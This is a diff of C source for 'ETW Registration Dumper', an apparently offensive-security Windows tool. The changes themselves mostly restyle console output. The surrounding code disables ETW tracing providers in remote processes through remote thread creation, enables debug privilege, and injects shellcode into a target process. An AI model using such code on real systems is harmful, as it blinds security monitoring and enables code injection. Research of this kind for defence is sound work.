@@ -272,7 +272,7 @@ VOID etw_search_process(
       sizeof(RTL_RB_TREE), &rd);
     
     wprintf(L"*********************************************\n");
-    wprintf(L"EtwpRegistrationTable for %ws:%i at %p\n", 
+    wprintf(L"  [ EtwpRegistrationTable for %ws:%i found at %p\n", 
       pe32->szExeFile, pe32->th32ProcessID, etw);
       
     // dump nodes
@@ -407,8 +407,8 @@ BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
       return FALSE;
     }
     
-    printf("*********************************************\n");
-    printf("EtwpRegistrationTable for %i found at %p\n", pid, etw);  
+    wprintf(L"*********************************************\n");
+    wprintf(L"  [ EtwpRegistrationTable for %i found at %p\n", pid, etw);  
     
     // try open target process
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -549,12 +549,12 @@ BOOL etw_disable(
     m = GetModuleHandle(L"ntdll.dll");
     pRtlCreateUserThread = (RtlCreateUserThread_t)
         GetProcAddress(m, "RtlCreateUserThread");
+    pEtwEventUnregister = (EventUnregister_t)GetProcAddress(m, "EtwEventUnregister");
     
     // create registration handle    
     RegHandle           = (REGHANDLE)((ULONG64)node | (ULONG64)index << 48);
-    pEtwEventUnregister = (EventUnregister_t)GetProcAddress(m, "EtwEventUnregister");
 
-    // execute payload in remote process
+    // execute API in remote process
     printf("  [ Executing EventUnregister in remote process.\n");
     nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
       NULL, pEtwEventUnregister, (PVOID)RegHandle, &ht, &cid);
@@ -621,14 +621,14 @@ VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
             node = etw_get_reg(hp, etw, prov, &re);
             if(node != NULL) {
               wprintf(L"*********************************************\n");
-              wprintf(L"Provider found in %ws:%i at %p\n\n", 
+              wprintf(L"  [ Provider found in %ws:%i at %p\n\n", 
                 pe.szExeFile, pe.th32ProcessID, (LPVOID)node);
       
               // show contents of it
               etw_reg_info(hp, node, &re, 0);
               // disable it?
               if(opt & ETW_OPT_DISABLE) {
-                wprintf(L"Tracing disabled: %s\n",
+                wprintf(L"  [ Tracing disabled: %s\n",
                   etw_disable(hp, node, re.RegIndex) ? L"OK" : L"FAILED");
               }
             }
@@ -662,7 +662,7 @@ int wmain(int argc, WCHAR *argv[]) {
             *process = NULL;
     int     i, pid=0, opt = ETW_OPT_SEARCH;
     
-    puts("\nETW Registration Dumper. Copyright (c) Odzhan\n");
+    puts("\n  [ ETW Registration Dumper. Copyright (c) Odzhan\n");
     
     for(i=1; i<=argc-1; i++) {
       // is this a switch?
@@ -707,31 +707,31 @@ int wmain(int argc, WCHAR *argv[]) {
       pid = name2pid(process);
       if(pid == 0) pid = wcstoull(process, NULL, 10);
       if(pid == 0) {
-        wprintf(L"ERROR: Unable to resolve pid for \"%s\".\n", process);
+        wprintf(L"  [ ERROR: Unable to resolve pid for \"%s\".\n", process);
         return -1;
       }
     }
     // injection specified, but no file or target process supplied?
     if ((opt & ETW_OPT_INJECT) && (file == NULL || pid == 0)) {
-      wprintf(L"ERROR: No shellcode or process specified for injection.\n");
+      wprintf(L"  [ ERROR: No shellcode or process specified for injection.\n");
       return 0;
     }
     
     // try enable debug privilege
     if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
-      wprintf(L"WARNING: Failed to enable debugging privilege.\n");
+      wprintf(L"  [ WARNING: Failed to enable debugging privilege.\n");
     }
     
     // inject code?
     if(opt & ETW_OPT_INJECT) {
-      wprintf(L"STATUS: Injection into %s : %s.\n", 
+      wprintf(L"  [ STATUS: Injection into %s : %s.\n", 
         process, 
         etw_inject(pid, file, prov) ? L"complete" : L"failed");
     } else {
       // perform a search or disable providers
       etw_search_system(pid, dll, prov, opt);
       
-      printf("Found %i providers.\n", prov_cnt);
+      wprintf(L"  [ Found %i providers that meet your criteria.\n", prov_cnt);
     }
     return 0;
 }
